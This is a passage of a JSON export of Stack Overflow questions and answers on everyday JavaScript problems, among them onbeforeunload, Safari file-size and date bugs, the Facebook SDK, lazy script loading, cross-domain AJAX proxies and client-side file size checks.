            "body": "<p>I have a form where the input fields are saved onChange. In firefox (5) this works even when the window is closed, but for Chrome and IE it doesn't and I need to be sure that I'm saving this data even if they try to close the window after they've typed in a field but an onBlur event hasn't occured (ie they've typed something into a textbox, but haven't tabbed out of it).</p>\n\n<p>I have read the following SO articles on using window.onbeforeunload:\n<a href=\"http://stackoverflow.com/questions/803887/can-i-pop-up-a-confirmation-dialog-when-the-user-is-closing-the-window-in-safari\">article 1</a>\n<a href=\"http://stackoverflow.com/questions/1244535/alert-when-browser-window-closed-accidentally\">article 2</a></p>\n\n<p>if I use the following:</p>\n\n<pre><code>window.onbeforeunload = function() {\n    return \"onbeforeunload\";\n}\n</code></pre>\n\n<p>then I get a popup with \"onbeforeunload\" in.</p>\n\n<p>but if I try:</p>\n\n<pre><code>window.onbeforeunload = function() {\n    alert(\"onbeforeunload\");\n}\n</code></pre>\n\n<p>then nothing happens in any browser, even firefox.</p>\n\n<p>what I want to achieve is:</p>\n\n<pre><code>window.onbeforeunload = function() {\n    saveFormData();\n}\n</code></pre>\n\n<p>I'd be grateful  if someone could point out where I might be going wrong.</p>\n\n<p>Many thanks</p>\n",
            "last_activity_date": 1399877239,
            "question_id": 7255649,
            "score": 10,
            "tags": [
                "javascript",
                "javascript-events"
            ],
            "title": "window.onbeforeunload not working"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>IT's a Safari bug. No solution for the moment. here is the test i did <a href=\"http://jsfiddle.net/rHd26/6/\" rel=\"nofollow\">http://jsfiddle.net/rHd26/6/</a></p>\n",
                    "is_accepted": true,
                    "score": 4
                },
                {
                    "body": "<p>Workaround for us was to remove multiple option... we got file size of 0, but we also got bad filenames with leading strange character added to the filename. Maybe that is why we get 0 in the size: because the first property (filename) is not split correctly with the presence of that bad character at the end of the filename.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Check this hack.</p>\n\n<p>It explains in detail how to remove multiple option for Safari only, leaving other browsers alone.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/15766644/any-workarounds-for-the-safari-html5-multiple-file-upload-bug/17515693#17515693\">Any workarounds for the Safari HTML5 multiple file upload bug?</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>A variation of this issue also seems to have infected mobile Safari on iOS 7, which just released.  If you have a \"multiple\" file input field, and select a video, then the File API returns a file size of 0.  Indeed the jsfiddle at the top of this page, reproduces this. </p>\n\n<p>Selecting one or more photos with the \"multiple\" option is fine - this only affects videos.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am experiencing inconsistencies with regard to multiple file upload in Safari 5.1 on Windows Vista (haven't tried other platforms).  The input element has the <code>multiple</code> flag to allow selection of multiple files.  The problem occurs when the user does actually select more then one file.  In this case, each <code>File</code> has a <code>size</code> attribute of <code>0</code>.  If (still with the <code>multiple</code> flag), the user only chooses one file, the <code>size</code> attribute correctly contains the file size.</p>\n\n<p>The problem can be seen in the following example. Test and view the output of both a single file selection and a multiple file selection.  (You will need to reset between tests).\n<a href=\"http://jsfiddle.net/rHd26/1/\">JsFiddle Test</a></p>\n\n<p>Does anyone know of a workaround?</p>\n",
            "last_activity_date": 1379679199,
            "question_id": 7231054,
            "score": 10,
            "tags": [
                "javascript",
                "file-upload",
                "safari",
                "filesize",
                "fileapi"
            ],
            "title": "file input size issue in safari for multiple file selection"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p><strong>Update: I added a little more detail to the answer:</strong></p>\n\n<p>First, you need to call FB.init and add your app id:</p>\n\n<pre><code>FB.init(\n{\n    appId  : APP_ID,\n    status : true, // check login status\n    cookie : true, // enable cookies to allow the server to access the session\n    xfbml  : true  // parse XFBML\n});\n</code></pre>\n\n<p>Next, check if there is a session open (i.e., the user is logged in)</p>\n\n<pre><code>if(FB.getSession() != null) {\n</code></pre>\n\n<p>And query the details by:</p>\n\n<pre><code>    FB.api('/me', function(response) \n    {\n        alert (\"Welcome \" + response.name + \": Your UID is \" + response.id); \n    });\n}\n</code></pre>\n\n<p>You will also need to add <code>&lt;div id=\"fb-root\"&gt;&lt;/div&gt;</code> to the <code>&lt;body&gt;</code> of your page, and load <code>&lt;script src=\"http://connect.facebook.net/en_US/all.js\"&gt;&lt;/script&gt;</code></p>\n\n<p>The user profile picure can be accessed as <code>http:/graph.facebook.com/USERID/picture/</code></p>\n\n<p>Check the Graph API reference here: <a href=\"http://developers.facebook.com/docs/reference/api/user/\">http://developers.facebook.com/docs/reference/api/user/</a></p>\n\n<p>and the FB SDK reference here: <a href=\"http://developers.facebook.com/docs/reference/javascript/\">http://developers.facebook.com/docs/reference/javascript/</a></p>\n",
                    "is_accepted": true,
                    "score": 14
                },
                {
                    "body": "<p>The function <code>FB.getSession()</code> used in the accepted answer to this question in 2011 is now (2012) deprecated and removed from the Facebook JS SDK.</p>\n\n<p>You can still discover the user's Facebook ID with the <code>getLoginStatus()</code> method like this:</p>\n\n<pre><code>FB.getLoginStatus(function(response) {\n  if (response.status === 'connected') {\n    alert (\"Your UID is \" + response.authResponse.userID);\n  }\n});\n</code></pre>\n\n<p>Note: you still have to init the Facebook API and put the <code>fb-root</code> element in your HTML, like Aleadam explained in the accepted answer.</p>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>In the <a href=\"https://developers.facebook.com/docs/guides/appcenter/#authorization\" rel=\"nofollow\">authorization parameter</a> of your app, ensure that the <strong>Auth Token</strong> Parameter is configured as <strong>URI Fragment</strong>.</p>\n\n<p>The login process using <a href=\"/questions/tagged/javascrit\" class=\"post-tag\" title=\"show questions tagged 'javascrit'\" rel=\"tag\">javascrit</a> is explained in the <a href=\"/questions/tagged/facebook\" class=\"post-tag\" title=\"show questions tagged 'facebook'\" rel=\"tag\"><img src=\"http://i.stack.imgur.com/L8rHf.png\" height=\"16\" width=\"18\" alt=\"\" class=\"sponsor-tag-img\">facebook</a> documentation there : <a href=\"https://developers.facebook.com/docs/facebook-login/getting-started-web/\" rel=\"nofollow\">Getting started with Facebook login</a>.</p>\n\n<p>Follow the <strong>three steps</strong>, source code is already written.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I need to get a facebook user uid , gender, photo and other profile data with Javascript.</p>\n\n<p>I remember there was a method to get an user object with .id, .gender, .photo but I haven't got a copy of the API call and I can't find an explanation in the documentation.</p>\n\n<p>How do I get the user UID and gender with Javascript ?</p>\n\n<p>Thanks</p>\n",
            "last_activity_date": 1406303967,
            "question_id": 5846752,
            "score": 10,
            "tags": [
                "javascript",
                "facebook"
            ],
            "title": "Getting an Facebook user profile data with Javascript"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>In JQuery you could <a href=\"http://api.jquery.com/jQuery.getScript/\">do this</a> on document ready</p>\n\n<pre><code>$.getScript(\"somescript.js\", function(){\n   alert(\"Script loaded and executed.\");\n });\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>use the getScript method of jquery! or try simply to put this script on the end of the page?</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Yes, this is possible by dynamically injecting the JavaScript files from code. There are lots of libraries which you can use:<a href=\"http://requirejs.org/\" rel=\"nofollow\">RequireJS</a>, <a href=\"http://headjs.com/\" rel=\"nofollow\">HeadJS</a> etc. Recently I found <a href=\"https://spreadsheets.google.com/ccc?key=0Aqln2akPWiMIdERkY3J2OXdOUVJDTkNSQ2ZsV3hoWVE#gid=2\" rel=\"nofollow\">this</a> document which compares lots of JavaScript loader libraries.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Yep, that's completely possible.  Add an onLoad=\"foo();\" event to your  tag and have it invoke your scripts.  You'll need to wrap your external JS in a function and do something like:</p>\n\n<pre><code>//EXTERNAL JS (jsstuff.js)\n\nfunction Mojo(){\ndocument.getElementById('snacks').style.visibility = \"visible\";\nalert(\"we are victorious!\");\n}\n\n//YOUR HTML\n\n&lt;html&gt;\n&lt;head&gt;\n&lt;script type='text/javascript'&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body onLoad='Mojo();'&gt;\n&lt;div id='snacks'&gt;\n&lt;img src='bigdarnimage.png'&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It is possible. I was doing a similar thing in an AJAX intensive site, but I was loading the Google Charts API. Here is the code I used to load the Google Charts API when a button was clicked on the page.</p>\n\n<pre><code>function loadGoogleChartsAPI () {\n\n    var script = document.createElement(\"script\");\n\n    // This script has a callback function that will run when the script has\n    // finished loading.\n    script.src = \"http://www.google.com/jsapi?callback=loadGraphs\";\n    script.type = \"text/javascript\";\n    document.getElementsByTagName(\"head\")[0].appendChild(script);\n}\n\nfunction loadGraphs () {\n    // Add callback function here.\n}\n</code></pre>\n\n<p>The Google Charts API allows you to use a callback function that will run when the script has loaded. I don't know if the Google Maps API has similar functionality, but I would guess it would.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>No one mentioned these?</p>\n\n<pre><code>$(window).load(function(){\n    // do something \n});\n</code></pre>\n\n<p>or</p>\n\n<pre><code>$(window).bind(\"load\", function() {\n   // do something\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>hey guys,\nsimple and quick question... is it actually possible to load certain scripts like</p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"somescript.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>when the rest of the page has loaded. Imagine I have a few larger scriptfiles like this that are not needed when the page is loaded. E.g. I'm using the google maps api that is only used when a button is clicked (so not on page load)...</p>\n\n<p>Is it possible to load the rest of the page first, before processing all those script tags in my head?</p>\n",
            "last_activity_date": 1416904817,
            "question_id": 5490996,
            "score": 10,
            "tags": [
                "javascript",
                "load"
            ],
            "title": "load scripts after page has loaded?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>The date parsing behavior on JavaScript is <em>implementation-dependent</em>, the ISO8601 format was recently added to the ECMAScript 5th Edition Specification, but this is not yet supported by all implementations.</p>\n\n<p>I would recommend you to parse it manually, for example:</p>\n\n<pre><code>function parseDate(input) {\n  var parts = input.match(/(\\d+)/g);\n  return new Date(parts[0], parts[1]-1, parts[2]);\n}\n\nparseDate('2011-01-03'); // Mon Jan 03 2011 00:00:00\n</code></pre>\n\n<p>Basically the above function matches each date part and uses the Date constructor, to build a date object, note that the <em>months</em> argument needs to be 0-based <em>(0=Jan, 1=Feb,...11=Dec)</em>.</p>\n",
                    "is_accepted": true,
                    "score": 29
                },
                {
                    "body": "<p>While @CMS's solution is probably superior, I found that using <code>Date.parse('2011-01-13')</code> is also a quick, working solution.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>csnover has some progressive ISO 8601 Date enhancement code available on GitHub:\n<a href=\"https://github.com/csnover/js-iso8601/blob/master/iso8601.js\" rel=\"nofollow\">https://github.com/csnover/js-iso8601/blob/master/iso8601.js</a></p>\n\n<p>Including his code should provide a temporary fix while the Safari team work toward a more complete ES5 implementation.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The easy solution I tried\nDownload date.js from <a href=\"http://datejs.com/\" rel=\"nofollow\">http://datejs.com/</a>\nInclude in your file</p>\n\n<p>then\n var date = Date.parse('1970-01-12 00:00:00');\n var formattedDate = date.toString('yyyy-MM-dd');</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm having an issue using the new Date() function in Javascript.  Safari is giving me an \"Invalid Date\" message.</p>\n\n<p>I've created a short example at <a href=\"http://jsbin.com/ogesi4/edit\">jsbin</a>.</p>\n\n<p>This appears to work on all other browsers, but not Safari.  Any ideas on how I can take the value from an input (such as 2011-01-03) and turn it into a date object, while having it work properly in Safari?</p>\n\n<p>Many thanks!</p>\n",
            "last_activity_date": 1397554260,
            "question_id": 4622732,
            "score": 10,
            "tags": [
                "javascript",
                "jquery",
                "date",
                "safari",
                "new-operator"
            ],
            "title": "new Date() using Javascript in Safari"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>In IE and Chrome, <code>event</code> is resolving to <code>window.event</code>. Firefox doesn't have this property and instead provides an event to an event handler function by passing it as a parameter. jQuery abstracts this difference for you by providing an event object parameter in all browsers:</p>\n\n<pre><code>$(\"&lt;a /&gt;\")\n    .append(\"demo\")\n    .click(function (evt) { DemoFunc(evt, value.Id) });\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 22
                },
                {
                    "body": "<p>If you have structured your code around working with the original event rather than the jQuery event, you can use <code>evt.originalEvent</code> to refer to the native event.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I generate HTML using jQuery:</p>\n\n<pre><code>$(\"&lt;a /&gt;\")\n    .append(\"demo\")\n    .click(function () { DemoFunc(event, value.Id) })\n</code></pre>\n\n<p>This works perfect for Chrome and IE8, but in FireFox I got an error: \"event is not defined\".\nI changed the code like this:</p>\n\n<pre><code>.attr(\"onclick\", \"DemoFunc(event, \" + value.Id + \")\")\n</code></pre>\n\n<p>It works for Firefox, but not for Chrome and IE.</p>\n\n<pre><code>DemoFunc = function (e, assocGroupId) {\n    var target = (e.target) ? $(e.target) : $(e.srcElement);\n    ....\n}\n</code></pre>\n\n<p>Why!? Help!! </p>\n",
            "last_activity_date": 1377827984,
            "question_id": 2974601,
            "score": 10,
            "tags": [
                "javascript",
                "jquery",
                "events",
                "click"
            ],
            "title": "event is not defined in FireFox, but ok in Chrome and IE"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>It looks like you have bumped into the <a href=\"http://en.wikipedia.org/wiki/Same_origin_policy\">same origin policy</a>. You have to use a relative path instead of your absolute <code>http://www.google.com</code> path.</p>\n\n<p>As one possible workaround, you could set up a very simple <a href=\"http://en.wikipedia.org/wiki/Reverse_proxy\">reverse proxy</a> (with <a href=\"http://httpd.apache.org/docs/2.0/mod/mod_proxy.html\">mod_proxy</a> if you are using Apache). This would allow you to use relative paths in your AJAX request, while the HTTP server would be acting as a proxy to any \"remote\" location. </p>\n\n<p>The fundamental configuration directive to set up a reverse proxy in mod_proxy is the ProxyPass. You would typically use it as follows:</p>\n\n<pre><code>ProxyPass     /web-services/     http://third-party.com/web-services/\n</code></pre>\n\n<p>In this case, the browser would be requesting <code>/web-services/service.xml</code> but the server would serve this by acting as a proxy to <code>http://third-party.com/web-services/service.xml</code>. </p>\n\n<p>Another common workaround would be to use <a href=\"http://en.wikipedia.org/wiki/JSONP\">JSONP</a>.</p>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>As a security measure, AJAX does not allow you to make requests to other domains. <a href=\"http://snook.ca/archives/javascript/cross_domain_aj\" rel=\"nofollow\">Cross Domain Ajax: a Quick Summary</a> discusses several ways to work around the problem. The easiest way is to use your server as a proxy to download remote content:</p>\n\n<blockquote>\n  <p>This is one of the most common approaches. Your script calls your server, your server makes the call to the remote server and then returns the result back to the client. There are some definite advantages to this approach: you have more control over the entire lifecycle. You can parse the data from the remote server, do with it what you will before sending it back to the client. If anything fails along the way, you can handle it in your own way. And lastly, you can log all remote calls. WIth that you can track success, failure and popularity.</p>\n</blockquote>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You can use <a href=\"http://davidpirek.com/blog/cross-domain-ajax-with-dynamic-script-tag\" rel=\"nofollow\">dynamic script loading</a>. Here is an article that I wrote about it.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I wanted to post another variation on the top answer.  I tried to use <code>ProxyPass</code> in my .htaccess file but I kept getting Internal Service Errors.  Finally after some reading I discovered there was another way to do this with the rewrite engine.</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^mail.php$ http://otherwebsite.com/mail.php [P,L]\n</code></pre>\n\n<p>The P in <code>[P,L]</code> tells the rewrite system that its using <code>mod_proxy</code>.  This worked for me and I didn't get internal server errors.</p>\n\n<p>The advantage to this approach is since it's using the <code>Rewrite Engine</code>, you have more control over the variables you might need to dynamically send to the script.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have an AJAX sample code from W3Schools, where if U request an AJAX call to remote server the request fails:</p>\n\n<pre><code>function loadXMLDoc() {\n  if (window.XMLHttpRequest) {\n    // code for IE7+, Firefox, Chrome, Opera, Safari\n    xmlhttp=new XMLHttpRequest();\n  }\n  else {\n    // code for IE6, IE5\n    xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n  }\n\n  xmlhttp.onreadystatechange = function() {\n    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) {\n      document.getElementById(\"myDiv\").innerHTML = xmlhttp.responseText;\n    }\n  }\n\n  xmlhttp.open(\"GET\", \"http://www.google.com\", true);\n  xmlhttp.send();\n}\n</code></pre>\n\n<p>What can I do to solve this?</p>\n",
            "last_activity_date": 1388113168,
            "question_id": 2851164,
            "score": 10,
            "tags": [
                "javascript",
                "ajax"
            ],
            "title": "Making an AJAX request to another server"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Realistically... by not overwriting it. You could always control access by wrapping it in an object that only offers GetObj with no SetObj, but of course, the wrapper is equally liable to overwriting, as are its \"private\" member properties that would be \"hidden\" via the GetObj method.</p>\n\n<p>Actually, question is a dupe:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/366047/can-read-only-properties-be-implemented-in-pure-javascript\">http://stackoverflow.com/questions/366047/can-read-only-properties-be-implemented-in-pure-javascript</a></p>\n\n<p>EDIT:</p>\n\n<p>After reading <a href=\"http://javascript.crockford.com/private.html\">http://javascript.crockford.com/private.html</a> , it is possible to use closure to create variable references that are truely inaccessible from the outside world. For instance:</p>\n\n<pre><code>function objectHider(obj)\n{\n    this.getObject=function(){return obj;}\n}\n\nvar someData={apples:5,oranges:4}\n\nvar hider=new objectHider(someData);\n\n//... hider.getObject()\n</code></pre>\n\n<p>where the reference to obj in objectHider <strong>cannot</strong> be modified after object creation.</p>\n\n<p>I'm trying to think of a practical use for this.</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>In the current widely available implementation, <a href=\"http://bclary.com/2004/11/07/\">ECMAScript 3</a> there is no support for real <em>immutability</em>.</p>\n\n<p>The <a href=\"http://www.ecma-international.org/publications/standards/Ecma-262-arch.htm\">ECMAScript 5</a> standard adds the <code>Object.seal</code> and <code>Object.freeze</code> methods.</p>\n\n<p>The <code>Object.seal</code> method will prevent property additions, still allowing the user to write to or edit the properties.</p>\n\n<p>The <code>Object.freeze</code> method will completely lock an object. Objects will stay exactly as they where when you <em>freeze</em> them and once an object has been frozen it cannot be <em>unfrozen</em>.</p>\n\n<p>In conclusion, for <em>real object immutability</em> we will have to wait until ECMAScript 5 </p>\n\n<p>More info: </p>\n\n<ul>\n<li><a href=\"http://ejohn.org/blog/ecmascript-5-objects-and-properties/\">ECMAScript 5 Objects and Properties</a></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 19
                }
            ],
            "body": "<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/366047/can-read-only-properties-be-implemented-in-pure-javascript\">Can Read-Only Properties be Implemented in Pure JavaScript?</a>  </p>\n</blockquote>\n\n\n\n<p>I have an Object that I only want to be defined when constructed. How can I prevent the Object  reference from being changed?</p>\n",
            "last_activity_date": 1268340357,
            "question_id": 2428409,
            "score": 10,
            "tags": [
                "javascript",
                "object",
                "reference",
                "readonly"
            ],
            "title": "How can you make a variable/Object read only in Javascript?"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>Javascript instructions are interpreted by the browser, and I don't think there is a C++ layer for JS (not that it would make much sense anyway). \nWhat are you trying to achieve?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You can try Google's V8</p>\n\n<p><a href=\"http://code.google.com/p/v8/\">http://code.google.com/p/v8/</a></p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Mozilla's Spidermonkey:</p>\n\n<p><a href=\"https://developer.mozilla.org/en/JavaScript%5FC%5FEngine%5FEmbedder%27s%5FGuide\" rel=\"nofollow\">https://developer.mozilla.org/en/JavaScript%5FC%5FEngine%5FEmbedder%27s%5FGuide</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>What about calling a server-side script via a Javascript XHR, that executes your C-program on system level?</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>JavaScript have different realisation (in different browsers)\nOn Windows platform you can use C++ code in form of COM-objects</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I'm not aware of any cross-browser solution, but for Firefox I'd suggest <a href=\"https://developer.mozilla.org/en/XPCOM\" rel=\"nofollow\">XPCOM</a>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>There are several different JavaScript engines you could use. I don't think they have a common programming interface so you'd have to pick one and work with it. Google Chrome uses <a href=\"http://code.google.com/p/v8/\" rel=\"nofollow\">V8</a> and Mozilla uses <a href=\"https://developer.mozilla.org/en/JavaScript%5FC%5FEngine%5FEmbedder%27s%5FGuide\" rel=\"nofollow\">spidermonkey</a>. Both V8 and spidermonkey are open source. I'd guess that spidermonkey is more mature since it's been around for a while. There is also <a href=\"http://webkit.org/projects/javascript/index.html\" rel=\"nofollow\">WebKit JavaScript engine</a> from Apple, also open source.</p>\n\n<p>Wikipedia also has <a href=\"http://en.wikipedia.org/wiki/JavaScript%5Fengine\" rel=\"nofollow\">a list of JavaScript engines</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>this is bit old question but if someone stumble upon this to find an answer i think this will be helpful <a href=\"https://developers.google.com/native-client/\" rel=\"nofollow\">https://developers.google.com/native-client/</a> but this works on Chrome only.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>does anybody know how to call C++ functions or methods via JavaScript.\nNeed scripting like Lua/Python-C++ but with JavaScript.</p>\n\n<p>Thanks in advance.</p>\n",
            "last_activity_date": 1327780391,
            "question_id": 1687437,
            "score": 10,
            "tags": [
                "javascript",
                "c++"
            ],
            "title": "How to call C++ functions/methods via JavaScript"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Divide the number by 10, round the result and multiply it with 10 again:</p>\n\n<pre><code>var number = 33;\nalert(Math.round(number / 10) * 10);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 26
                },
                {
                    "body": "<pre><code>Math.round(x / 10) * 10\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>I needed something similar, so I wrote a function. I used the function for decimal rounding <a href=\"https://stackoverflow.com/a/27861660/271351\">here</a>, and since I also use it for integer rounding, I will set it as the answer here too. In this case, just pass in the number you want to round and then 10, the number you want to round to.</p>\n\n<pre><code>function roundToNearest(numToRound, numToRoundTo) {\n    numToRoundTo = 1 / (numToRoundTo);\n\n    return Math.round(numToRound * numToRoundTo) / numToRoundTo;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Using Javascript, I would like to round a number passed by a user to the nearest 10. For example, if 7 is passed I should return 10, if 33 is passed I should return 30.</p>\n",
            "last_activity_date": 1420810266,
            "question_id": 1684202,
            "score": 10,
            "tags": [
                "javascript"
            ],
            "title": "How to round an integer up or down to the nearest 10 using Javascript"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Use a <a href=\"http://www.regular-expressions.info/javascript.html\">regular expression</a>.</p>\n\n<pre><code>var r = /\\d+/;\nvar s = \"you can enter maximum 500 choices\";\nalert (s.match(r));\n</code></pre>\n\n<p>The expression <code>\\d+</code> means \"one or more digits\". Regular expressions by default are <a href=\"http://www.regular-expressions.info/repeat.html\">greedy</a> meaning they'll grab as much as they can. Also, this:</p>\n\n<pre><code>var r = /\\d+/;\n</code></pre>\n\n<p>is equivalent to:</p>\n\n<pre><code>var r = new RegExp(\"\\d+\");\n</code></pre>\n\n<p>See the <a href=\"https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/RegExp\">details for the RegExp object</a>.</p>\n\n<p>The above will grab the <strong>first</strong> group of digits. You can loop through and find all matches too:</p>\n\n<pre><code>var r = /\\d+/g;\nvar s = \"you can enter 333 maximum 500 choices\";\nvar m;\nwhile ((m = r.exec(s)) != null) {\n  alert(m[0]);\n}\n</code></pre>\n\n<p>The <code>g</code> (global) flag is key for this loop to work.</p>\n",
                    "is_accepted": false,
                    "score": 34
                }
            ],
            "body": "<p>Suppose i have a string like - \"you can enter maximum 500 choices\".\nSo extract 500 from the string.</p>\n\n<p>The main problem is the String may vary like \"you can enter maximum 12500 choices\".\nSo how to get the integer part.</p>\n",
            "last_activity_date": 1256655544,
            "question_id": 1623221,
            "score": 10,
            "tags": [
                "javascript",
                "regex"
            ],
            "title": "how to find a number in a string using javascript"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>Other that aquiring the filename there is no way for you to find out any other details about the file in javascript including its size.</p>\n\n<p>Instead you should configure server-side script to block an oversized upload.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>It might be possible using a lot of browser-specific code. Take a look at the source of <a href=\"http://www.tiddlywiki.com/\" rel=\"nofollow\">TiddlyWiki</a>, which manages to save itself on the user's hard drive by hooking into Windows Scripting Host (IE), XPCOM (Mozilla), etc.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I don't think there is any way of doing that with plain JS from a web page.<br />\nWith a browser extension maybe, but from a page javascript cannot access the filesystem for security reasons.</p>\n\n<p>Flash and Java should have similar restrictions, but maybe they are a bit less strict.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><strike>No you can't. But you can add the maxlength attribute which gives the maximal size of the file in bytes.</p>\n\n<pre><code>&lt;input type=\"file\" maxlength=\"100000\" ... /&gt;\n</code></pre>\n\n<p></strike></p>\n\n<p>But doing a server-side check is definitely the way to go as Dominic Rodger pointed out.</p>\n\n<p><strong>EDIT</strong>: This is only true for HTML 3.2, as @nickf pointed out :)</p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>not possible. would be a major security concern to allow client side scripts to run that can read file info from and end users hard drive.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>See <a href=\"http://www.w3.org/TR/FileAPI/\">http://www.w3.org/TR/FileAPI/</a>. It is supported by Firefox 3.6; I don't know about any other browsers. </p>\n\n<p>Within the <code>onchange</code> event of a <code>&lt;input id=\"fileInput\" type=\"file\" /&gt;</code> simply:</p>\n\n<pre><code>var fi = document.getElementById('fileInput');\nalert(fi.files[0].size); // maybe fileSize, I forget\n</code></pre>\n\n<p>You can also return the contents of the file as a string, and so forth. But again, this may only work with Firefox 3.6.</p>\n",
                    "is_accepted": false,
                    "score": 26
                },
                {
                    "body": "<p>See here:</p>\n\n<p><a href=\"http://www.kavoir.com/2009/01/check-for-file-size-with-javascript-before-uploading.html\" rel=\"nofollow\">http://www.kavoir.com/2009/01/check-for-file-size-with-javascript-before-uploading.html</a></p>\n\n<p>As to all the people saying this has to be done server side, they are absolutely spot on it does. </p>\n\n<p>In my case though the maximum size I will except is 128Mb, if a user tries to upload something that is 130Mb they should not have to wait the 5 minute upload time to find out it is too big so I need to do an additional check before they submit the page for usability sake.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Most of these answers are way out-of-date.  It is currently possible to determine file size client-side in any browser that supports the File API.  This includes, pretty much, all browsers other than IE9 and older.  </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Now it is possible to get file size using pure JavaScript. Nearly all browser support FileReader, which you can use to read file size as well as you can show image without uploading file to server. <a href=\"https://developer.mozilla.org/en/docs/DOM/FileReader\">link</a></p>\n\n<p>Code:</p>\n\n<pre><code>    var oFile = document.getElementById(\"file-input\").files[0]; // input box with type file;\n    var img = document.getElementById(\"imgtag\");\n    var reader = new FileReader();\n    reader.onload = function (e) {\n            console.log(e.total); // file size \n            img.src =  e.target.result; // putting file in dom without server upload.\n\n   };\n   reader.readAsDataURL(oFile );\n</code></pre>\n\n<p>You can get file size directly from file object using following code. </p>\n\n<pre><code> var fileSize = oFile.size;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I have upload file functionality on one of the page. I check for the extension of the file using JavaScript. Now i want to restrict the user from uploading file greater than 1 MB. Is there any way i can check the file upload size using JavaScript.</p>\n\n<p>My code currently look like this:</p>\n\n<pre><code>&lt;script language=\"JavaScript\"&gt;\nfunction validate() {\n   var filename = document.getElementById(\"txtChooseFile\").value;\n   var ext = getExt(filename);\n   if(ext == \"txt\" || ext == \"csv\")\n      return true;\n   alert(\"Please upload Text files only.\");\n   return false;\n}\n\nfunction getExt(filename) {\n   var dot_pos = filename.lastIndexOf(\".\");\n   if(dot_pos == -1)\n      return \"\";\n   return filename.substr(dot_pos+1).toLowerCase();\n}\n&lt;/script&gt;\n</code></pre>\n",
            "last_activity_date": 1366704108,
            "question_id": 1606842,
            "score": 10,
            "tags": [
                "javascript",
                "upload"
            ],
            "title": "How can I get a file&#39;s upload size using simple Javascript?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
